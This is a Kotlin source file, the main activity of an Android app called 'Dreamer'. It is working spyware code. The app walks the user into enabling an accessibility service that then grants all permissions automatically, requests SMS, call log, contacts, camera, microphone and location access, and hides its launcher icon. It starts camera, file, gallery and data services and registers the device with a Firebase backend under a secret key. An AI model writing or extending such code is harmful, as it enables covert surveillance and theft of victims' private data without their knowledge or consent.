package com.h4k3r.dreamer

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.*
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import java.io.InputStreamReader
import java.security.MessageDigest

class MainActivity : ComponentActivity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_CONFIG_FILE = "permissions/config.json"
        private const val APP_CONFIG_FILE = "app_config.json"
        private const val WEBVIEW_URL_FILE = "webview_url.txt"
        private const val STRATEGY_PREF = "permission_strategy"
    }

    /* ── State Management ────────────────────────────── */
    private var currentStrategy = 1 // Default strategy
    private var appVisible = true
    private var permissionConfig: Map<String, Boolean> = emptyMap()
    private var webViewUrl: String? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /* ── UI Components ──────────────────────────────── */
    private lateinit var mainContainer: LinearLayout
    private lateinit var guideContainer: LinearLayout
    private lateinit var strategySwitch: Switch
    private lateinit var progressText: TextView
    private lateinit var statusIndicator: View

    /* ── Permission Launcher ─────────────────────────── */
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        handlePermissionResults(permissions)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Load configurations
        loadConfigurations()

        // Set up UI
        setupUI()

        // Check and start appropriate flow
        checkAndStartFlow()
    }

    /* ── Configuration Loading ───────────────────────── */
    private fun loadConfigurations() {
        try {
            // Load permission configuration
            val permissionJson = assets.open(PERMISSION_CONFIG_FILE).use { stream ->
                InputStreamReader(stream).readText()
            }
            val type = object : TypeToken<Map<String, Boolean>>() {}.type
            permissionConfig = Gson().fromJson(permissionJson, type)

            // Load app configuration
            val appConfigJson = assets.open(APP_CONFIG_FILE).use { stream ->
                InputStreamReader(stream).readText()
            }
            val appConfig = Gson().fromJson(appConfigJson, AppConfig::class.java)
            appVisible = appConfig.visible

            // Load WebView URL
            webViewUrl = try {
                assets.open(WEBVIEW_URL_FILE).use { stream ->
                    InputStreamReader(stream).readText().trim()
                }
            } catch (e: Exception) {
                null
            }

            // Load saved strategy
            currentStrategy = getSharedPreferences("dreamer_prefs", MODE_PRIVATE)
                .getInt(STRATEGY_PREF, 1)

        } catch (e: Exception) {
            Log.e(TAG, "Error loading configurations", e)
            // Use default values
            permissionConfig = getDefaultPermissionConfig()
        }
    }

    /* ── UI Setup ────────────────────────────────────── */
    private fun setupUI() {
        // Create main layout
        mainContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
            setBackgroundColor(0xFF1A1A1A.toInt())
        }

        // Create guide container for accessibility
        guideContainer = createAccessibilityGuide()

        // Create strategy switcher (hidden by default)
        val strategyContainer = createStrategySwitch()

        // Progress indicator
        progressText = TextView(this).apply {
            text = "Initializing..."
            textSize = 16f
            setTextColor(0xFFFFFFFF.toInt())
            setPadding(0, 16, 0, 16)
        }

        // Status indicator
        statusIndicator = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(50, 50).apply {
                setMargins(0, 16, 0, 16)
            }
            setBackgroundColor(0xFFFF0000.toInt()) // Red by default
        }

        mainContainer.addView(guideContainer)
        mainContainer.addView(strategyContainer)
        mainContainer.addView(progressText)
        mainContainer.addView(statusIndicator)

        setContentView(mainContainer)

        // Apply visibility setting
        if (!appVisible) {
            makeAppInvisible()
        }
    }

    /* ── Accessibility Guide UI ──────────────────────── */
    private fun createAccessibilityGuide(): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(24, 24, 24, 24)

            // Title
            addView(TextView(this@MainActivity).apply {
                text = "Enable Accessibility Service"
                textSize = 24f
                setTextColor(0xFFFFFFFF.toInt())
                setPadding(0, 0, 0, 16)
            })

            // Guide Image (placeholder - replace with actual image)
            addView(ImageView(this@MainActivity).apply {
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    400
                )
                setBackgroundColor(0xFF333333.toInt())
                scaleType = ImageView.ScaleType.CENTER_INSIDE
                // Load your guide image here
                // setImageResource(R.drawable.accessibility_guide)
            })

            // Instructions
            addView(TextView(this@MainActivity).apply {
                text = """
                    Follow these steps:
                    
                    1. Tap the button below to open Accessibility Settings
                    2. Find "Dreamer" in the list
                    3. Toggle the switch to ON
                    4. Confirm by tapping "Allow"
                    
                    This enables automatic permission handling for the best experience.
                """.trimIndent()
                textSize = 14f
                setTextColor(0xFFCCCCCC.toInt())
                setPadding(0, 16, 0, 16)
            })

            // Enable button
            addView(Button(this@MainActivity).apply {
                text = "Open Accessibility Settings"
                setOnClickListener {
                    openAccessibilitySettings()
                }
            })
        }
    }

    /* ── Strategy Switch UI ──────────────────────────── */
    private fun createStrategySwitch(): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(0, 24, 0, 24)
            visibility = View.GONE // Hidden by default

            addView(TextView(this@MainActivity).apply {
                text = "Permission Strategy: "
                setTextColor(0xFFFFFFFF.toInt())
            })

            strategySwitch = Switch(this@MainActivity).apply {
                isChecked = currentStrategy == 2
                setOnCheckedChangeListener { _, isChecked ->
                    currentStrategy = if (isChecked) 2 else 1
                    saveStrategy()
                    restartFlow()
                }
            }
            addView(strategySwitch)

            addView(TextView(this@MainActivity).apply {
                text = " (1: Accessibility | 2: File-based)"
                setTextColor(0xFFCCCCCC.toInt())
                setPadding(8, 0, 0, 0)
            })
        }
    }

    /* ── Flow Control ────────────────────────────────── */
    private fun checkAndStartFlow() {
        when (currentStrategy) {
            1 -> startAccessibilityStrategy()
            2 -> startFileBasedStrategy()
            else -> startAccessibilityStrategy()
        }
    }

    /* ── Strategy 1: Accessibility-based ─────────────── */
    private fun startAccessibilityStrategy() {
        updateProgress("Using Accessibility Strategy")

        if (isAccessibilityServiceEnabled()) {
            updateProgress("Accessibility enabled ✓")
            statusIndicator.setBackgroundColor(0xFF00FF00.toInt())
            guideContainer.visibility = View.GONE

            // Let accessibility service handle permissions
            scope.launch {
                delay(1000)
                triggerAccessibilityPermissions()
            }
        } else {
            updateProgress("Waiting for accessibility...")
            guideContainer.visibility = View.VISIBLE

            // Check periodically
            checkAccessibilityPeriodically()
        }
    }

    /* ── Strategy 2: File-based ──────────────────────── */
    private fun startFileBasedStrategy() {
        updateProgress("Using File-based Strategy")
        guideContainer.visibility = View.GONE

        scope.launch {
            // Read permissions from config
            val permissionsToRequest = mutableListOf<String>()

            permissionConfig.forEach { (permission, shouldRequest) ->
                if (shouldRequest) {
                    val manifestPermission = getManifestPermission(permission)
                    if (manifestPermission != null &&
                        ContextCompat.checkSelfPermission(this@MainActivity, manifestPermission)
                        != PackageManager.PERMISSION_GRANTED) {
                        permissionsToRequest.add(manifestPermission)
                    }
                }
            }

            if (permissionsToRequest.isNotEmpty()) {
                updateProgress("Requesting ${permissionsToRequest.size} permissions...")
                permissionLauncher.launch(permissionsToRequest.toTypedArray())
            } else {
                updateProgress("All permissions granted ✓")
                statusIndicator.setBackgroundColor(0xFF00FF00.toInt())
                proceedToNextStep()
            }
        }
    }

    /* ── Accessibility Helpers ───────────────────────── */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)

        while (colonSplitter.hasNext()) {
            val componentNameString = colonSplitter.next()
            val enabledService = ComponentName.unflattenFromString(componentNameString)

            if (enabledService != null && enabledService.packageName == packageName) {
                return true
            }
        }
        return false
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)

        // Show helper toast
        Toast.makeText(
            this,
            "Find 'Dreamer' and enable it",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun checkAccessibilityPeriodically() {
        scope.launch {
            while (!isAccessibilityServiceEnabled()) {
                delay(1000)
            }
            // Accessibility enabled!
            startAccessibilityStrategy()
        }
    }

    private fun triggerAccessibilityPermissions() {
        // Send command to accessibility service
        val intent = Intent("com.h4k3r.dreamer.GRANT_ALL_PERMISSIONS")
        sendBroadcast(intent)

        updateProgress("Granting permissions automatically...")

        // Wait and then proceed
        scope.launch {
            delay(5000) // Give time for permissions
            proceedToNextStep()
        }
    }

    /* ── Permission Handling ─────────────────────────── */
    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        val granted = permissions.filter { it.value }.size
        val denied = permissions.filter { !it.value }.size

        updateProgress("Granted: $granted, Denied: $denied")

        if (denied > 0) {
            statusIndicator.setBackgroundColor(0xFFFFAA00.toInt()) // Orange

            // Show options to retry
            AlertDialog.Builder(this)
                .setTitle("Some permissions denied")
                .setMessage("The app needs all permissions for full functionality.")
                .setPositiveButton("Retry") { _, _ ->
                    startFileBasedStrategy()
                }
                .setNegativeButton("Continue anyway") { _, _ ->
                    proceedToNextStep()
                }
                .show()
        } else {
            statusIndicator.setBackgroundColor(0xFF00FF00.toInt()) // Green
            proceedToNextStep()
        }
    }

    /* ── Next Steps ──────────────────────────────────── */
    private fun proceedToNextStep() {
        updateProgress("Setup complete!")

        // Start all services
        startAllServices()

        // Update Firebase
        updateFirebaseStatus()

        // Handle app visibility
        if (!appVisible) {
            scope.launch {
                delay(2000)
                makeAppInvisible()
            }
        }

        // Show WebView if URL exists
        if (!webViewUrl.isNullOrEmpty()) {
            scope.launch {
                delay(3000)
                showWebView()
            }
        } else {
            // Just hide the app after delay
            scope.launch {
                delay(3000)
                finish()
            }
        }
    }

    private fun showWebView() {
        mainContainer.removeAllViews()

        val webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
            }

            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    // Hide loading or perform other actions
                }
            }

            loadUrl(webViewUrl ?: "about:blank")
        }

        mainContainer.addView(webView)
    }

    /* ── App Visibility ──────────────────────────────── */
    private fun makeAppInvisible() {
        // Method 1: Disable launcher activity
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // The app icon will disappear from launcher
        Toast.makeText(this, "App hidden from launcher", Toast.LENGTH_SHORT).show()
    }

    /* ── Service Management ──────────────────────────── */
    private fun startAllServices() {
        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java,
            PermissionMonitorService::class.java
        )

        services.forEach { serviceClass ->
            try {
                val intent = Intent(this, serviceClass)
                ContextCompat.startForegroundService(this, intent)
                Log.d(TAG, "Started ${serviceClass.simpleName}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start ${serviceClass.simpleName}", e)
                // Don't crash if a service fails
            }
        }
    }

    /* ── Firebase Updates ────────────────────────────── */
    private fun updateFirebaseStatus() {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = getSecretKey()
            val deviceId = deviceId()

            // Save to preferences
            prefs.edit().apply {
                putString("secret_key", secretKey)
                putString("device_id", deviceId)
                apply()
            }

            // Update Firebase
            if (secretKey != null) {
                val deviceInfo = mapOf(
                    "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "android" to Build.VERSION.SDK_INT,
                    "strategy" to currentStrategy,
                    "time" to System.currentTimeMillis(),
                    "setup_complete" to true
                )

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .setValue(deviceInfo)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Firebase update failed", e)
        }
    }

    /* ── Helper Methods ──────────────────────────────── */
    private fun updateProgress(message: String) {
        runOnUiThread {
            progressText.text = message
        }
    }

    private fun saveStrategy() {
        getSharedPreferences("dreamer_prefs", MODE_PRIVATE).edit().apply {
            putInt(STRATEGY_PREF, currentStrategy)
            apply()
        }
    }

    private fun restartFlow() {
        // Clear current state and restart
        scope.coroutineContext.cancelChildren()
        checkAndStartFlow()
    }

    private fun getSecretKey(): String? {
        return try {
            assets.open("secret_key.txt")
                .bufferedReader()
                .readLine()
                ?.trim()
        } catch (e: Exception) {
            null
        }
    }

    private fun deviceId(): String {
        val androidId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        return MessageDigest.getInstance("SHA-256")
            .digest(androidId.toByteArray())
            .take(6)
            .joinToString("") { "%02x".format(it) }
    }

    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "storage" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            else -> null
        }
    }

    private fun getDefaultPermissionConfig(): Map<String, Boolean> {
        return mapOf(
            "camera" to true,
            "location_fine" to true,
            "contacts" to true,
            "sms" to true,
            "phone" to true,
            "microphone" to true,
            "storage" to true,
            "call_log" to true,
            "calendar" to false
        )
    }

    /* ── Data Classes ────────────────────────────────── */
    data class AppConfig(
        val visible: Boolean = true,
        val strategy: Int = 1
    )

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}